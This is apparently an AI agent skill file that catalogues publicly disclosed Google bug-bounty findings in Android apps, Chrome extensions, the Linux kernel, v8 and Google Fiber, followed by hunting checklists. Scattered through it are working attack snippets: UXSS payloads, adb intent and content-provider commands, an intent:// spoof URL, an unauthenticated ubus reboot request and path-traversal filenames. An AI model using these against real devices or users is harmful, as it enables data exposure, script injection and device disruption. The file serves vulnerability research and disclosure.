---
name: google-vrp-android
description: Google VRP / Mobile VRP techniques for Android apps, Chrome, browser extensions, iOS, low-level exploits. Android intent redirects without BROWSABLE enforcement (Scene Viewer, Faceviewer, Firebase Dynamic Links, Play Store market://); path traversal in Android attachment filenames (Drive, Gmail, Chats); confused-deputy in Play Services via cross-user content:// URIs with INTERACT_ACROSS_USERS; Google App fullscreen spoof; Task hijacking via missing taskAffinity (StrandHogg); GmsSubscribedFeedsProvider exported; Chrome extension UXSS via chrome.runtime.sendMessage (User-Agent Switcher, Google Translate); Tag Assistant SOP bypass; Application Launcher for Drive RCE via native messaging on Windows; Linux kernel UAF via io_uring (kernelCTF $11.3M); v8CTF OOB write; Fuchsia/gVisor PRNG seed leak; Google Fiber ubus JSON-RPC unauth. Checklists: Android Google apps (exported activities/providers, intent:// redirects, path traversal, StrandHogg), Chrome extensions (externally_connectable, compromised-renderer). Source: 202 public HoF reports. Use alongside google-vrp-cloud and google-vrp-web. Spanish triggers — "android google", "mobile vrp", "chrome extension", "intent android", "kernelctf", "v8ctf", "chrome xss", "aplicacion android google", "google play", "extension chrome".
---

# Google VRP — Android / Chrome / Mobile / Kernel Techniques

Subset of 202-report public Hall-of-Fame. Focus: Android apps, Chrome browser extensions, mobile VRP, kernel/v8CTF, iOS, Google Fiber.
Use alongside `google-vrp-cloud` and `google-vrp-web`.

---

## Recurring patterns (mobile/chrome domain)

15. **Android intent redirects / BROWSABLE bypass** — Google App / Scene Viewer / Faceviewer / Firebase Dynamic Links forward `intent://` URIs without the `BROWSABLE` category, defeating Chromium's mitigation and choosing arbitrary browsers/apps.
16. **Path traversal in Android app downloads / Drive / Gmail** — filename `../../../foo` accepted by Google Chats, Gmail. Combined with TCC entitlement inheritance on macOS Drive (child injection) for permission escalation.
17. **Confused-deputy in Google Play Services** — `ACTION_PICK` with cross-user `content://10@media/external/images/media/<id>` URI; GMS reads with `INTERACT_ACROSS_USERS`.

---

## Per-report catalog

### #1 — $11,333,700 — David Bouman — kernelCTF — Linux Kernel io_uring (CVE-2022-2602)
UAF in `io_uring` registered files: `unix_scm_cycle_create` GC freed a fixed file still in use by a queued request. Cross-cache primitive: free victim slab, reallocate same pages via `__get_free_pages` from `io_mem_alloc()` (rings/sqes mmap-ed to userspace → freed object is live in user memory, no header pollution, no allocator races). `IORING_OP_RECVMSG` side-channel through provided buffers to leak `socket_file_operations` byte-by-byte; `IORING_OP_FADVISE → netdev_init` to leak controlled buffer address; `__io_commit_cqring` (32-bit write) + `bsg_get_command_q` (32-bit read) gadgets to flip cred/nsproxy. Reliability ~80–90%.

### #16 — $1,000,000 — madStacks — v8CTF — n-day v8 OOB write
Reproduced from public regression test of v8 commit 10b0e62e. R/W/AOF primitives in v8 sandbox, leaked WebAssembly RWX page address from WasmInstance object, ROP via `mov` constant gadgets, copied final shellcode to RWX page.

### #21 — $750,000 — Amit Klein et al. — Fuchsia/gVisor PRNG seed leak
Network-stack secrets predictable from observed TCP ISN, TCP timestamp, source ports, IPv4/IPv6 fragment IDs. Discloses internal IP behind NAT, enables DNS cache poisoning, TCP blind reset, IPv4 ID hash collision attacks, device tracking across networks. Files: `gvisor.dev/gvisor/pkg/tcpip/` and `golang/go/src/math/rand/rng.go`.

### #35 — $500,000 — NDevTK — Tag Assistant Legacy SOP bypass
On any site: `chrome.runtime.sendMessage({message:'LoadScript', url:'http://192.168.1.1'}, console.log)` — content script proxies arbitrary HTTP fetches and returns response; reads internal LAN pages.

### #45 — $500,000 — Jun Kokatsu — User-Agent Switcher extension UXSS
Compromised renderer: `chrome.extension.sendRequest({action:"add_ua", user_agent:"X'+alert(origin)+'"})`  injects UA into the content script's `Object.defineProperty` template → executes JS on every site that reads `navigator.userAgent`.

### #50 — $450,000 — Thrivikram Guruprasad — Mobile VRP — Google Chats Android path traversal
Attachment filename `../../../PathTraversal/code.txt` writes outside `/Download` to `/storage/emulated/0/PathTraversal`.

### #51 — $450,000 — NDevTK — Google App Faceviewer trusts gstatic
`<a href="faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://ssl.gstatic.com/<reflected-xss-on-gstatic>">` then `faceViewerWebXBridge.postMessage(JSON.stringify({cmd: btoa(':\x0f\n\rtestintent://')}))` invokes a non-browsable intent from the web.

### #52 — $450,000 — NDevTK — Play Store `market://` intent bypass
`market://details?id=com.sec.android.app.sbrowser&url=https%3A%2F%2Fexample.org` opens Samsung Browser to attacker URL without prompting, bypassing Chromium's other-browser launch dialog.

### #59 — $313,370 — Khaled Elmasrey — Google Fiber `ubus` JSON-RPC unauth reboot
`POST /ubus` with `{"method":"call","params":["00000000…","session","login",{"username":"","password":""}]}` returns a session, then `system reboot` reboots the router. Also `assist` username on more locked-down hosts.

### #60 — $313,370 — NDevTK — Google App fullscreen spoof via Scene Viewer / Faceviewer
`faceviewer://` and `intent://arvr.google.com/scene-viewer/...` open in fullscreen without warning toast — full address-bar spoof.

### #62 — $313,370 — NDevTK — Application Launcher For Drive lax messaging
`externally_connectable.matches: ["*://*.google.com/*"]` lets any `google.com` subdomain (including `http://`) post to extension; `chrome.runtime.connect('lmjegmlicamnimmfhcmpkclmigmmcbeh',{name:'com.google.drive.nativeproxy'})` opens shared `.vbs` files via native messaging on Windows → RCE.

### #69 — $313,370 — Jun Kokatsu — Google Translate extension UXSS
Compromised renderer sets `chrome.storage.local.set({gtxTargetLang:"X'+alert(1)+'"})`; later code-injects into translated page.

### #78 — $187,500 — Jatin — Google Keep `VoiceActionActivity` exported
`adb shell am start-activity -a com.google.android.gms.actions.CREATE_NOTE --es android.intent.extra.TEXT testing com.google.android.keep/.activities.VoiceActionActivity` lets any 3rd-party app create / delete / update notes.

### #89 — $133,700 — sithi — GMS confused-deputy across Android users
`ACTION_PICK` returns `content://10@media/external/images/media/<id>` (cross-user URI). GMS reads with `INTERACT_ACROSS_USERS` and shows the image (another user's photos / contact pics) in the profile-photo crop.

### #92 — $112,500 — NDevTK — Google App webapp install spoof via intent
`location.href='intent://search.app.goo.gl/?link=…name=Chrome…icon=…&query=https://attacker#Intent;package=com.google.android.googlequicksearchbox;end&apn=…#Intent;package=com.google.android.gms;…'` shows install prompt without origin and with attacker-chosen icon; can also bypass home-screen step.

### #101 — $50,000 — GMS in-app browser exposes JS bridge `mm`
Long click-trail leads to a "private" browser without parental controls, exposing `addEncryptionRecoveryMethod`, `setVaultSharedKeys`, `closeView` — a pinned-app bypass surface.

### #116 — $50,000 — Jatin — `GmsSubscribedFeedsProvider` exported with no permission
`adb shell content query --uri content://com.google.android.gms.subscribedfeeds/accounts` returns Google account list and sync feeds without any Android permission.

## $0 reports (one-liners)
- **#159** `mkto-sj380051.com` (CNAME from `email.mandiant.com`) HTTPS certificate mismatch.
- **#167** Google App Scene Viewer launches arbitrary `intent://` (BROWSABLE bypass).
- **#172** Calendar deeplink RSVP without consent — `adb shell am start-activity -d 'https://calendar.google.com/calendar/event?eid=<base64_event_id_email>&action=RESPOND&rst=2'` responds Yes/No/Maybe. `eid` is base64 `<event_id> <email>@m`.
- **#175** Firebase Dynamic Links opens arbitrary intents (e.g. Samsung Browser) bypassing Chromium's non-default-browser prompt.
- **#188** YouTube Studio Android task hijacking via missing `taskAffinity` (StrandHogg v1).
- **#190** `ads-resources-legacy.waze.com` outdated nginx 1.4.6 (potentially CVE-2014-0133 SPDY).
- **#196** Android Google Password Autofill biometric requirement disabled without authentication.
- **#200** Nearby Connections WiFi pivot — P2P_STAR: malicious advertiser switches discoverer's WiFi to attacker AP, sets default route via DHCP → captures all victim Internet traffic.

---

## Checklists

### Android Google apps:
- `android:exported=true` activities/providers/services without permission.
- `intent://` redirects without `CATEGORY_BROWSABLE` enforcement (Scene Viewer, Faceviewer, Firebase Dynamic Links, Google App, Play Store `market://`).
- path traversal in attachment filenames (Drive, Gmail, Chats) — `../../../foo`.
- `taskAffinity` collisions for task hijacking (StrandHogg v1).
- `content://<userId>@…` cross-user URI confused-deputy on apps with `INTERACT_ACROSS_USERS`.
- TCC entitlement inheritance via child injection on macOS desktop builds (`--debugger_command`).
- exported content providers missing permission checks (e.g. `GmsSubscribedFeedsProvider`).

### Browser extensions Google ships:
- `externally_connectable.matches` containing `*://*.google.com/*` and `http://` (allows any http google.com subdomain).
- background scripts trusting `chrome.storage.local.set` from content scripts on arbitrary sites.
- helpers that proxy fetches without origin checks (arbitrary LAN page reads).
- compromised-renderer threat model: `chrome.runtime.sendMessage` from a content script of any URL.
- native messaging handlers opening files/executables without path validation.
